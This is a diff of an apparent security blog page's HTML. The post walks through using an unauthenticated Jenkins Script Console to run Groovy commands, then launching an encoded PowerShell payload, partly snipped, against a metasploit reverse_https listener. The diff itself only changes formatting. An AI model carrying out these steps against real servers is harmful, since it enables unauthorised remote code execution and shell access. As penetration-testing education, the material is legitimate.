@@ -10,7 +10,6 @@
   <meta name="googlebot" content="index,follow,snippet,archive">
   <meta property="og:title" content="jenkins to meterpreter toying with powersploit" />
 <meta property="og:description" content="
-     
 
 
 Recently I came across a few Jenkins continuous integration servers. A relatively old version I might add but that fact was not important. What was important though was the fact that it was not configured to be &lsquo;secure&rsquo;. Right out of the box Jenkins does not require any authentication to make use of it. In fact, it seems like its almost plug and play." />
@@ -23,7 +22,6 @@ Recently I came across a few Jenkins continuous integration servers. A relativel
   <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="jenkins to meterpreter toying with powersploit"/>
 <meta name="twitter:description" content="
-     
 
 
 Recently I came across a few Jenkins continuous integration servers. A relatively old version I might add but that fact was not important. What was important though was the fact that it was not configured to be &lsquo;secure&rsquo;. Right out of the box Jenkins does not require any authentication to make use of it. In fact, it seems like its almost plug and play."/>
@@ -174,7 +172,7 @@ if (!doNotTrack) {
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2015%2f05%2f27%2fjenkins-to-meterpreter-toying-with-powersploit%2f&name=jenkins%20to%20meterpreter%20toying%20with%20powersploit&description=%3cfigure%3e%0a%20%20%20%20%3cimg%20src%3d%22%2fimages%2fjenkins_logo.png%22%2f%3e%20%0a%3c%2ffigure%3e%0a%0a%3cp%3eRecently%20I%20came%20across%20a%20few%20%3ca%20href%3d%22https%3a%2f%2fjenkins-ci.org%2f%22%3eJenkins%3c%2fa%3e%20continuous%20integration%20servers.%20A%20relatively%20old%20version%20I%20might%20add%20but%20that%20fact%20was%20not%20important.%20What%20was%20important%20though%20was%20the%20fact%20that%20it%20was%20not%20configured%20to%20be%20%3cem%3e%26lsquo%3bsecure%26rsquo%3b%3c%2fem%3e.%20Right%20out%20of%20the%20box%20Jenkins%20does%20not%20require%20any%20authentication%20to%20make%20use%20of%20it.%20In%20fact%2c%20it%20seems%20like%20its%20almost%20plug%20and%20play.%3c%2fp%3e">
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2015%2f05%2f27%2fjenkins-to-meterpreter-toying-with-powersploit%2f&name=jenkins%20to%20meterpreter%20toying%20with%20powersploit&description=%3cfigure%3e%3cimg%20src%3d%22%2fimages%2fjenkins_logo.png%22%2f%3e%0a%3c%2ffigure%3e%0a%0a%3cp%3eRecently%20I%20came%20across%20a%20few%20%3ca%20href%3d%22https%3a%2f%2fjenkins-ci.org%2f%22%3eJenkins%3c%2fa%3e%20continuous%20integration%20servers.%20A%20relatively%20old%20version%20I%20might%20add%20but%20that%20fact%20was%20not%20important.%20What%20was%20important%20though%20was%20the%20fact%20that%20it%20was%20not%20configured%20to%20be%20%3cem%3e%26lsquo%3bsecure%26rsquo%3b%3c%2fem%3e.%20Right%20out%20of%20the%20box%20Jenkins%20does%20not%20require%20any%20authentication%20to%20make%20use%20of%20it.%20In%20fact%2c%20it%20seems%20like%20its%20almost%20plug%20and%20play.%3c%2fp%3e">
       <i class="fab fa-tumblr " aria-hidden="true"></i>
     </a>
   </li>
@@ -246,23 +244,20 @@ if (!doNotTrack) {
 
   
     <div class="content" itemprop="articleBody">
-      <figure>
-    <img src="https://leonjza.github.io/images/jenkins_logo.png"/> 
+      <figure><img src="https://leonjza.github.io/images/jenkins_logo.png"/>
 </figure>
 
 <p>Recently I came across a few <a href="https://jenkins-ci.org/">Jenkins</a> continuous integration servers. A relatively old version I might add but that fact was not important. What was important though was the fact that it was not configured to be <em>&lsquo;secure&rsquo;</em>. Right out of the box Jenkins does not require any authentication to make use of it. In fact, it seems like its almost plug and play.</p>
 <h2 id="groooooooovy">groooooooovy</h2>
 <p>At first glance I was not too sure about what opportunities I was presented with when finding this. Poking around through the web interface eventually got me to the <em>Script Console</em> that Jenkins provides:</p>
-<figure>
-    <img src="https://leonjza.github.io/images/jenkins_script_console.png"/> 
+<figure><img src="https://leonjza.github.io/images/jenkins_script_console.png"/>
 </figure>
 
 <p>This looked promising. <em>&lsquo;Type in an arbitrary Groovy script and execute it on the server.'</em> I had zero idea what Groovy Script was so to the le-Googles it was. Some research revealed that it is actually possible to execute commands using it. In fact, the syntax was quite expressive as explained in the <a href="http://www.groovy-lang.org/groovy-dev-kit.html#process-management">documentation</a>.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">def process = &#34;ls -l&#34;.execute()
 println &#34;Found text ${process.text}&#34;
 </code></pre></div><p>The documentation goes into enough detail explaining the different options you have to execute commands, but the above snippet was enough to get going. To help with testing, I setup a local instance of the latest Jenkins (v1.615) and ran the Groovy Script. Remember, I was able to do this without any authentication requirement!</p>
-<figure>
-    <img src="https://leonjza.github.io/images/jenkins_console_command_exec.png"/> 
+<figure><img src="https://leonjza.github.io/images/jenkins_console_command_exec.png"/>
 </figure>
 
 <p>Nice and easy command execution! :D</p>
@@ -287,8 +282,7 @@ println &#34;Found text ${process.text}&#34;
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc aQBlAHgAIAAoAE4 <span style="color:#7fffd4">[snip]</span> BjBkACcAKQAKAA==
 </code></pre></div><h2 id="pwn">pwn</h2>
 <p>So, I now had the <code>payload</code> file available for download via HTTP, and the command I needed to run. The last thing I had to do was setup a reverse_https listener in metasploit and run the command!</p>
-<figure>
-    <img src="https://leonjza.github.io/images/jenkins_powershell_payload.png"/> 
+<figure><img src="https://leonjza.github.io/images/jenkins_powershell_payload.png"/>
 </figure>
 
 <p>From the python web server we can see the request come in for the payload:</p>
@@ -453,7 +447,7 @@ python -m SimpleHTTPServer
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2015%2f05%2f27%2fjenkins-to-meterpreter-toying-with-powersploit%2f&name=jenkins%20to%20meterpreter%20toying%20with%20powersploit&description=%3cfigure%3e%0a%20%20%20%20%3cimg%20src%3d%22%2fimages%2fjenkins_logo.png%22%2f%3e%20%0a%3c%2ffigure%3e%0a%0a%3cp%3eRecently%20I%20came%20across%20a%20few%20%3ca%20href%3d%22https%3a%2f%2fjenkins-ci.org%2f%22%3eJenkins%3c%2fa%3e%20continuous%20integration%20servers.%20A%20relatively%20old%20version%20I%20might%20add%20but%20that%20fact%20was%20not%20important.%20What%20was%20important%20though%20was%20the%20fact%20that%20it%20was%20not%20configured%20to%20be%20%3cem%3e%26lsquo%3bsecure%26rsquo%3b%3c%2fem%3e.%20Right%20out%20of%20the%20box%20Jenkins%20does%20not%20require%20any%20authentication%20to%20make%20use%20of%20it.%20In%20fact%2c%20it%20seems%20like%20its%20almost%20plug%20and%20play.%3c%2fp%3e">
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2015%2f05%2f27%2fjenkins-to-meterpreter-toying-with-powersploit%2f&name=jenkins%20to%20meterpreter%20toying%20with%20powersploit&description=%3cfigure%3e%3cimg%20src%3d%22%2fimages%2fjenkins_logo.png%22%2f%3e%0a%3c%2ffigure%3e%0a%0a%3cp%3eRecently%20I%20came%20across%20a%20few%20%3ca%20href%3d%22https%3a%2f%2fjenkins-ci.org%2f%22%3eJenkins%3c%2fa%3e%20continuous%20integration%20servers.%20A%20relatively%20old%20version%20I%20might%20add%20but%20that%20fact%20was%20not%20important.%20What%20was%20important%20though%20was%20the%20fact%20that%20it%20was%20not%20configured%20to%20be%20%3cem%3e%26lsquo%3bsecure%26rsquo%3b%3c%2fem%3e.%20Right%20out%20of%20the%20box%20Jenkins%20does%20not%20require%20any%20authentication%20to%20make%20use%20of%20it.%20In%20fact%2c%20it%20seems%20like%20its%20almost%20plug%20and%20play.%3c%2fp%3e">
       <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
     </a>
   </li>
